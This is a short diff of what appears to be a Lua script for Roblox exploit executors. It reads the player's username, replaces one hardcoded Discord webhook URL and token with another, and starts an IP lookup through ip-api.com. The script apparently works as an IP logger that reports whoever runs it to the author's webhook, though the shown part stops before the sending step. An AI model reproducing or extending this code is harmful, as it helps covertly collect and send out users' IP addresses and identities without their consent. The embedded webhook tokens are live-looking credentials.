@@ -1,6 +1,6 @@
 local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1033505291536437248/_XffRq7ntNEFpE0za5TJXUfUlcHP6KxkodTLRhh9UqG37YgdkgKbH6ieHiof0hyzVUbX"
+local webhook_url = "https://discord.com/api/webhooks/1034598291545018388/thb7lma7JZXSbN5CHBkVOkoaaT2FaMuavy5XNDx0jwVWLRVgcI6tXKPALtbtP4y4qq49"
 
 local ip_info = requestfunc({
     Url = "http://ip-api.com/json",
